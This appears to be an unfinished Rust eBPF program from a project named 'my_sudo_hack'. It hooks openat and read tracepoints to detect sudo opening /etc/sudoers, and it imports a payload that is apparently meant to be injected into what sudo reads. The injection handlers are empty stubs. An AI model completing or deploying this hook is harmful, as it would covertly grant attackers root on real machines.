#![no_std]
#![no_main]

use core::ffi::c_void;

use aya_ebpf::{
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_get_current_uid_gid,
        gen::bpf_probe_read_user_str,
    },
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::info;
use my_sudo_hack_common::{max_payload_len, payload, payload_len, uid};

#[map]
// Map to hold the File Descriptors from 'openat' calls
static map_fds: HashMap<u64, u32> = HashMap::<u64, u32>::with_max_entries(8192, 0);

#[map]
// Map to hold the buffer sized from 'read' calls
static map_buff_addrs: HashMap<usize, u32> = HashMap::<usize, u32>::with_max_entries(8192, 0);

const SUDO_LEN: usize = 5;
const SUDOERS_LEN: usize = 13;
const sudo: &[u8] = b"sudo\0";
const sudoers: &[u8] = b"/etc/sudoers\0";

#[tracepoint]
pub fn handle_openat_enter(ctx: TracePointContext) -> u32 {
    match hanle_openat_enter_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_openat_exit(ctx: TracePointContext) -> u32 {
    match handle_openat_exit_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_read_enter(ctx: TracePointContext) -> u32 {
    match handle_read_enter_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_read_exit(ctx: TracePointContext) -> u32 {
    match handle_read_exit_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn hanle_openat_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
    // If filtering by UID check that
    if unsafe { uid != 0 } {
        let current_uid = bpf_get_current_uid_gid() >> 32;
        if unsafe { uid != current_uid as u32 } {
            return Ok(0);
        }
    }

    let comm = bpf_get_current_comm();
    if comm.is_err() {
        return Ok(0);
    }

    // Check comm is sudo
    let comm = comm.unwrap();
    for i in 0..SUDO_LEN {
        if comm[i] != sudo[i] {
            return Ok(0);
        }
    }

    let mut filename: [u8; SUDOERS_LEN] = [0; SUDOERS_LEN];

    let target_filename = unsafe { ctx.read_at::<u64>(24) };

    if target_filename.is_err() {
        return Ok(0);
    }
    let target_filename = target_filename.unwrap() as *const c_void;

    let ret = unsafe {
        bpf_probe_read_user_str(
            filename.as_mut_ptr() as *mut c_void,
            SUDOERS_LEN as u32,
            target_filename,
        )
    };

    if ret < 0 {
        return Err(0);
    }

    for i in 0..SUDOERS_LEN {
        if filename[i] != sudoers[i] {
            return Ok(0);
        }
    }

    // Add pid_tgid to map for our sys_exit call
    let pid_tgid = bpf_get_current_pid_tgid();
    let _ = map_fds.insert(&pid_tgid, &0, 0);

    Ok(0)
}

fn handle_openat_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
    Ok(0)
}

fn handle_read_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
    Ok(0)
}

fn handle_read_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
    Ok(0)
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
